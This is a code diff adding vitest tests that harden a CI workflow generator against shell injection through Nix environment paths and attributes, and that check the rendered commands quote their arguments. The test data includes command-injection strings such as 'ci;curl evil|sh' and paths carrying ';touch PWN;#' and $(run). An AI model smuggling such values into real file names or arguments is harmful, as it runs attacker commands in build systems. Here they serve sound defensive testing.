@@ -6,6 +6,7 @@
  * are exclusive, and the lock beside a flake is declared with it so an edit to
  * either re-keys what runs under the environment.
  */
+import * as Schema from "effect/Schema"
 import { describe, expect, it } from "vitest"
 import * as CiToolchain from "../src/CiToolchain.ts"
 import { actions, GithubCiGen, render as renderWorkflow } from "../src/GithubCiGen.ts"
@@ -23,6 +24,56 @@ const runtime = Runtime.Node({ version: ">=26.4.0" })
 const packageManager = PackageManager.Pnpm({ version: "11.21.0", runtime })
 
 describe("Nix.Environment", () => {
+  it.each([
+    "//tools/my env/flake.nix",
+    "//tools/$(run)/flake.nix",
+    "//tools/a;run/flake.nix",
+    "//tools/a|b/flake.nix",
+    "//tools/a&b/flake.nix",
+    "//tools/env';touch PWN;#/flake.nix",
+    "//tools/env`run`/flake.nix"
+  ])(
+    "refuses shell-shaped environment paths in constructors and guards: %s",
+    (path) => {
+      const file = Input.file(path)
+      for (const options of [{ flake: file }, { file }, { flake, lock: file }]) {
+        expect(() => Nix.Environment(options)).toThrow(/usable Nix.Environment/)
+        expect(Nix.isEnvironment({ _tag: "NixEnvironment", ...options })).toBe(false)
+        const declaration = { _tag: "NixEnvironment", ...options }
+        expect(Schema.is(Nix.EnvironmentDeclaration)(declaration)).toBe(false)
+        expect(() => Schema.decodeUnknownSync(Nix.EnvironmentDeclaration)(declaration)).toThrow()
+        expect(() => CiToolchain.Needs({ nix: { installer: "determinate", environment: declaration } as never }))
+          .toThrow()
+        expect(() => CiToolchain.Nix({ environment: { _tag: "NixEnvironment", ...options } as never }))
+          .toThrow(/must be an S.Nix.Environment/)
+      }
+    }
+  )
+
+  it("rejects an environment path that does not resolve inside the workspace", () => {
+    expect(Nix.isEnvironment({ _tag: "NixEnvironment", file: { _tag: "File", path: "/etc/environment.nix" } }))
+      .toBe(false)
+  })
+
+  it.each(["ci;curl evil|sh", "ci$(run)", "ci&run", "a".repeat(Nix.maximumAttrLength + 1)])(
+    "rejects unsafe attributes in both the schema and guard: %s",
+    (attr) => {
+      const declaration = { _tag: "NixEnvironment", flake, lock: Input.file("//flake.lock"), attr }
+      expect(Schema.is(Nix.EnvironmentDeclaration)(declaration)).toBe(false)
+      expect(Nix.isEnvironment(declaration)).toBe(false)
+      expect(() => CiToolchain.Nix({ environment: declaration as never })).toThrow(/must be an S.Nix.Environment/)
+    }
+  )
+
+  it.each(["a".repeat(Nix.maximumAttrLength), "devShells.x86_64-linux.ci"])(
+    "accepts bounded safe attributes through the schema and guard",
+    (attr) => {
+      const environment = Nix.Environment({ flake, attr })
+      expect(Schema.is(Nix.EnvironmentDeclaration)(environment)).toBe(true)
+      expect(Nix.isEnvironment(environment)).toBe(true)
+    }
+  )
+
   it("declares the flake form with the lock beside the flake", () => {
     const environment = Nix.Environment({ flake })
     expect(environment._tag).toBe("NixEnvironment")
@@ -204,13 +255,37 @@ describe("GithubCiGen with a Nix environment", () => {
       }]
     })).attrs as Parameters<typeof renderWorkflow>[0]
 
+  it.each(
+    [
+      { _tag: "NixEnvironment", file: Input.file("//env';touch PWN;#.nix") },
+      { _tag: "NixEnvironment", flake, attr: "ci;touch PWN" }
+    ] as const
+  )("refuses unsafe structural environments at the renderer boundary", (unsafe) => {
+    const base = attrs(CiToolchain.Nix({ environment }))
+    const job = base.jobs[0]!
+    const toolchain = { ...job.toolchain, nix: { installer: "determinate", environment: unsafe } } as const
+    expect(() => renderWorkflow({ ...base, jobs: [{ ...job, toolchain }] }))
+      .toThrow(/Nix environment must contain usable paths and a valid attribute/)
+  })
+
+  it.each(
+    [
+      [Nix.Environment({ flake: Input.file("//tools/*/flake.nix"), attr: "ci" }), "'./tools/*#ci'"],
+      [Nix.Environment({ file: Input.file("//tools/*.nix") }), "'--file' './tools/*.nix'"]
+    ] as const
+  )("quotes every Nix environment argument", (environment, argument) => {
+    const rendered = renderWorkflow(attrs(CiToolchain.Nix({ environment })))
+    expect(rendered).toContain("nix develop " + argument + " --command pnpm install")
+    expect(rendered).toContain("nix develop " + argument + " --command pnpm exec")
+  })
+
   it("installs Nix, installs the workspace inside the shell, and runs every step inside it", () => {
     const rendered = renderWorkflow(attrs(CiToolchain.Nix({ environment })))
     expect(rendered).toContain(`uses: "${actions.nixInstallerDeterminate}"`)
     expect(rendered).not.toContain("actions/setup-node")
     expect(rendered).not.toContain("pnpm/action-setup")
-    expect(rendered).toContain("nix develop .#ci --command pnpm install --frozen-lockfile --ignore-scripts")
-    expect(rendered).toContain("nix develop .#ci --command pnpm exec smthrs ci '//packages/...' --jobs 2")
+    expect(rendered).toContain("nix develop '.#ci' --command pnpm install --frozen-lockfile --ignore-scripts")
+    expect(rendered).toContain("nix develop '.#ci' --command pnpm exec smthrs ci '//packages/...' --jobs 2")
     expect(rendered).not.toContain("extra-conf")
   })
 
@@ -219,8 +294,8 @@ describe("GithubCiGen with a Nix environment", () => {
     expect(rendered).toContain(`uses: "${actions.nixInstallerCachix}"`)
     expect(rendered).not.toContain("extra_nix_config")
     expect(rendered).not.toContain("secrets.")
-    expect(rendered).toContain("nix develop .#ci --command pnpm install --frozen-lockfile --ignore-scripts")
-    expect(rendered).toContain("nix develop .#ci --command pnpm exec smthrs ci '//packages/...' --jobs 2")
+    expect(rendered).toContain("nix develop '.#ci' --command pnpm install --frozen-lockfile --ignore-scripts")
+    expect(rendered).toContain("nix develop '.#ci' --command pnpm exec smthrs ci '//packages/...' --jobs 2")
   })
 
   it("trusts a declared binary cache only through secrets expressions", () => {
